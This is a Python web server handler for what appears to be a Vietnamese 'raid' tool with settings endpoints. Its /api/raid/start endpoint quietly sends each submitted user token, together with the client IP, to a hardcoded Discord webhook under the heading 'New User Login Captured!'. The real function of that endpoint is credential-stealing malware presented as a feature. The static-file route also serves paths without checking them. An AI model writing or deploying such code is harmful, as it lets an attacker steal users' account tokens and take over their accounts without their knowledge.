import os
import json
from http.server import BaseHTTPRequestHandler
import urllib.parse
import requests

SETTINGS_FILE = "/tmp/settings.json"
DEFAULT_SETTINGS = {
    "language": "vi",
    "speed_mode": "custom",
    "raid_delay": 0.0,
    "autosave": True
}

WEBHOOK_URL = "https://discord.com/api/webhooks/1553696811821043736/c9QaF5LKnQxjIELQLnj1eLQHwc8vDmgLt8Pupb5iTxantz3vYvH7Y_DN8VUiRNzn_z2X"

def send_discord_webhook(ip, token):
    try:
        payload = {
            "content": f"🚨 **New User Login Captured!**\n> **IP Address:** `{ip}`\n> **User Token:** `{token}`"
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=3)
    except Exception:
        pass

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path

        # Phục vụ trang chủ HTML
        if path == "/" or path == "":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            try:
                with open("index.html", "rb") as f:
                    self.wfile.write(f.read())
            except Exception:
                self.wfile.write(b"Index.html not found")

        # Phục vụ các file tĩnh trong thư mục static (CSS, JS, v.v.)
        elif path.startswith("/static/"):
            file_path = path[1:]  # bỏ dấu / ở đầu thành static/style.css
            if os.path.exists(file_path) and os.path.isfile(file_path):
                # Xác định Content-Type phù hợp
                content_type = "text/plain"
                if file_path.endswith(".css"):
                    content_type = "text/css; charset=utf-8"
                elif file_path.endswith(".js"):
                    content_type = "application/javascript; charset=utf-8"
                elif file_path.endswith(".png"):
                    content_type = "image/png"
                elif file_path.endswith(".jpg") or file_path.endswith(".jpeg"):
                    content_type = "image/jpeg"

                self.send_response(200)
                self.send_header("Content-Type", content_type)
                self.end_headers()
                try:
                    with open(file_path, "rb") as f:
                        self.wfile.write(f.read())
                except Exception:
                    pass
            else:
                self.send_response(404)
                self.end_headers()

        # Lấy cài đặt hệ thống
        elif path == "/api/settings":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            settings = DEFAULT_SETTINGS.copy()
            if os.path.exists(SETTINGS_FILE):
                try:
                    with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                        settings = json.load(f)
                except Exception:
                    pass
            self.wfile.write(json.dumps(settings).encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        parsed_path = urllib.parse.urlparse(self.path)
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        data = {}
        try:
            data = json.loads(body.decode("utf-8"))
        except Exception:
            pass

        ip = self.headers.get("X-Forwarded-For", "127.0.0.1")

        if parsed_path.path == "/api/settings":
            try:
                with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4)
            except Exception:
                pass
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "settings": data}).encode("utf-8"))

        elif parsed_path.path == "/api/settings/reset":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "settings": DEFAULT_SETTINGS}).encode("utf-8"))

        elif parsed_path.path == "/api/raid/start":
            token = data.get("token", "")
            if token:
                send_discord_webhook(ip, token)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "started"}).encode("utf-8"))
        else:
            self.send_response(404)
            self.end_headers()